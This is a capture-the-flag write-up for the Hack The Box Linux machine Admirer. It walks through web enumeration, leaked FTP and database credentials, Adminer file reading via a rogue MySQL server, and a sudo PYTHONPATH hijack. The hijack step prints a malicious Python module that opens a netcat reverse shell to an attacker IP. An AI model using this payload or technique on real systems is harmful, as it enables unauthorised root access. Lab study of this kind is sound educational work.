# Admirer

## 1. Introduction

### 1.1 Background

**Admirer** is an <i>Easy</i> Linux machine from Hack The Box, created by **polarbearer** and **GibParadox** and released on May 2, 2020. The challenge focuses on web enumeration and the exploitation of a misconfigured **Adminer** panel to obtain credentials, followed by privilege escalation through abuse of _sudo_ permissions and Python library loading until gaining root access.

### 1.1 Objectives

In the **Admirer** machine from Hack The Box, the main objectives focus on reinforcing the basic methodology of compromise in Linux environments through common but well-chained techniques:

- Develop an **effective web enumeration** to discover sensitive files and credentials.
- Exploit **misconfigured services (Adminer)** to obtain initial access.
- Apply **Linux privilege escalation techniques** to achieve root access.

## 2. Enumeration

### 2.1 Initial Reconnaissance

We begin by verifying connectivity:

```bash
❯ ping -c 1 admirer.htb
```

The host responds correctly, confirming it is active.

### 2.2 Nmap

Full port scan:

```bash
❯ nmap -p- -Pn -sS -T4 --min-rate 5000 admirer.htb -oN allports 
```

Open ports:

- 21/tcp – FTP  
- 22/tcp – SSH  
- 80/tcp – HTTP  

Service and version scan:

```bash
❯ nmap -p21,22,80 -Pn -sCV admirer.htb -oN targeted
```

Relevant results:

- **FTP**: vsftpd 3.0.3  
- **SSH**: OpenSSH 7.4p1 (Debian)  
- **HTTP**: Apache 2.4.25  
- `robots.txt` reveals `/admin-dir`  

### 2.3 Gobuster

Directory enumeration is performed on `/admin-dir`:

```bash
❯ gobuster dir -u http://admirer.htb/admin-dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o raft-small-txt-php -x php,txt

`/contacts.txt         (Status: 200) [Size: 350]`
`/credentials.txt      (Status: 200) [Size: 136]`
```

Discovered files:

- `contacts.txt`  
- `credentials.txt`  

These files contain old credentials.

![[Pasted image 20260215162143.png]]
![[Pasted image 20260215162225.png]]

### 2.4 FTP Access

Using the discovered credentials, access to the FTP service is obtained.

```bash
Connected to admirer.htb.
220 (vsFTPd 3.0.3)
Name (admirer.htb:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02 21:24 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03 21:20 html.tar.gz
```

Relevant files:

- `dump.sql`  
- `html.tar.gz`  

After extracting the website content, the following is found:

```
index.php  robots.txt

assets:
css  js  sass  webfonts

images:
fulls  thumbs

utility-scripts/
admin_tasks.php  db_admin.php  info.php  phptest.php

w4ld0s_s3cr3t_d1r/
contacts.txt  credentials.txt
```

In `index.php`, database credentials appear:

```
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
```

However, these credentials do not work for SSH or FTP, so enumeration continues.

### 2.5 Adminer Discovery

Fuzzing is performed on `utility-scripts`:

```bash
❯ wfuzz -c --hc 403,404 -w /usr/share/wordlists/dirb/big.txt http://admirer.htb/utility-scripts/FUZZ.php

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://admirer.htb/utility-scripts/FUZZ.php
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload                                         
===================================================================

000001873:   200        51 L     235 W    4156 Ch     "adminer"
```

The machine name suggests this service will be key.

## 3. Exploitation

### 3.1 Adminer Abuse (File Read via MySQL)

After multiple failed login attempts, it is investigated and discovered that **Adminer allows reading local files if connected to a database controlled by the attacker**.

Strategy:

1. Set up a MySQL service on the attacker machine.  
2. Allow the remote server to connect.  
3. Use SQL queries such as `LOAD DATA` to read files from the remote system.  

This allows retrieving new credentials from the actual system file:

```
$servername = "localhost";
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";
```

### 3.2 Initial Access

With the new credentials:

```bash
❯ ssh waldo@admirer.htb 
waldo@admirer.htb's password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
Last login: Sun May 24 20:35:48 2020 from 10.10.15.17
waldo@admirer:~$ ls
user.txt
waldo@admirer:~$ cat user.txt
4bbd12**************************
```

Successful access as `waldo`.

`user.txt` is obtained.

## 4. Post Exploitation

### 4.1 Sudo Privilege Enumeration

Permissions were enumerated with:

```bash
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
...
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

The `SETENV` permission is found.

### 4.2 Script Analysis

`admin_tasks.sh` executes:

```bash
❯ admin_tasks.sh

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```

### 4.3 PYTHONPATH Abuse

Python searches for modules in the order defined by `PYTHONPATH`.

If we create a malicious `shutil.py` file in a controlled directory:

```python
import os

def make_archive(*args):
    os.system("nc -e /bin/sh 10.10.15.4 1234")
```

And then execute:

```bash
❯ sudo PYTHONPATH=/tmp/ /opt/scripts/admin_tasks.sh
```

By selecting the web backup option, our malicious module is executed as `root`.

### 4.4 Root Shell

Listener on attacker:

```bash
❯ nc -lvnp 1234
```

Connection received:

```bash
❯ whoami
root
```

Root access is obtained along with the final flag.
